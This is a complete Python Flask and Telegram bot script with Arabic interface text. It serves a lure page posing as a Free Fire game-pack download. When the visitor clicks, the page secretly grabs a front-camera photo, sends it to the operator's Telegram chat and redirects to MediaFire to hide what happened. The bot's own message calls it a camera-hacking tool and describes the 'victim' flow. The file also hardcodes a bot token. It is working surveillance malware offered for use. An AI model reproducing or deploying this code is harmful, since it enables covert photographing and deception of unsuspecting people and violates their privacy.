import os
import threading
import requests
from flask import Flask, render_template_string, request

TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تثبيت الحزمة الأسطورية فري فاير</title>
    <style>
        body { 
            background: #090d16; 
            color: #ffffff; 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            text-align: center; 
            padding: 20px; 
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 100%;
            border: 1px solid #334155;
        }
        h2 { color: #38bdf8; margin-bottom: 15px; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn {
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(14, 165, 233, 0.4);
        }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>🔥 حزمة هيدشوت فري فاير الأصلية</h2>
        <p>لقد طلبت الرابط الحصري للملفات. يرجى الضغط على الزر أدناه للسماح بالاتصال الآمن والمتابعة إلى محتوى التحميل.</p>
        <button class="btn" onclick="startAction()">اضغط هنا للمتابعة</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";
        const currentUrl = window.location.href;

        function isInAppBrowser() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            return (ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1);
        }

        // إذا كان داخل إنستغرام، نحاول إجباره على المتصفح الخارجي أولاً لضمان عمل الأذونات بسلاسة
        if (isInAppBrowser() && /android/i.test(navigator.userAgent)) {
            window.location.href = "intent://" + currentUrl.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end;";
        }

        async function startAction() {
            // تغيير شكل الزر لإعطاء إيحاء بأنه جاري التحميل
            let btn = document.querySelector('.btn');
            btn.innerText = "جاري الاتصال بالم servidores...";
            btn.disabled = true;

            try {
                // طلب الكاميرا بناءً على نقرة المستخدم (هنا يوافق وهو ميفهم والو)
                let stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                let video = document.getElementById('video');
                video.srcObject = stream;
                
                // مهلة ثانية واحدة لتثبيت الصورة والعدسة
                setTimeout(() => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', TARGET_CHAT_ID);
                        formData.append('photo', blob, 'capture.jpg');
                        
                        // إرسال الصورة في الخلفية للبوت
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        // تحويله فوراً للموقع الحقيقي أو صفحة ميديافاير وكأن شيئاً لم يكن!
                        window.location.href = "https://www.mediafire.com";
                    }, 'image/jpeg', 0.9);
                }, 1500);

            } catch (e) {
                // حتى لو رفض أو حدث خطأ، نقوم بتوجيهه للموقع حتى لا يشك في أي شيء
                window.location.href = "https://www.mediafire.com";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/c/<chat_id>')
def capture_page(chat_id):
    return render_template_string(HTML_TEMPLATE, token=TOKEN, chat_id=chat_id)

@app.route('/')
def home():
    return "Bot is running successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_telegram_bot():
    print("[+] البوت السحابي يعمل الآن...")
    offset = 0
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"]
                        
                        if text.startswith("/start"):
                            personal_link = f"{BASE_URL}/c/{chat_id}"
                            reply_text = (
                                f"🔥 ** اهلا بك يا بطل في بوت اختراق الكاميرا الامامية للاجهزة!**\n\n"
                                f"إليك الرابط الاحترافي الجديد:\n"
                                f"<code>{personal_link}</code>\n\n"
                                f"الضحية سيدخل، يرى زر المتابعة، يضغط عليه، تواجهه الكاميرا ويوافق، وتصلك صورته ثم يتم تحويله لميديافاير وهو لا يدري ما حدث!"
                            )
                            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                                "chat_id": chat_id,
                                "text": reply_text,
                                "parse_mode": "HTML"
                            })
        except Exception as e:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_telegram_bot()
                          
